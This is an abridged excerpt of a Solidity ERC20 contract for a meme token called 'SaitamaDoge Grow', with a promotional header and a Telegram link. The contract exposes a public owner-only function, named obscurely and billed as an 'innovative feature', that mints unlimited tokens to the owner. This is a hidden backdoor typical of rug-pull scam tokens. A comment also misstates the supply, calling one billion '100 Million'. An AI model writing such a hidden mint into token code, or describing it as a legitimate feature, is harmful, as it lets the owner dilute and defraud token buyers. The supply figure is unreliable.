...
//
// $SaitamaDogeGrow proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SaitageGrow
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SaitamaDogeGrow(uint256 amount) public onlyOwner {
 _SaitamaDogeGrow(msg.sender, amount);
    }
    ...
    function _SaitamaDogeGrow(address account, uint256 amount) internal virtual {
...
contract $SaitamaDogeGrow is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SaitamaDoge Grow", "SAITAGEGROW") {
     _SaitamaDogeGrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}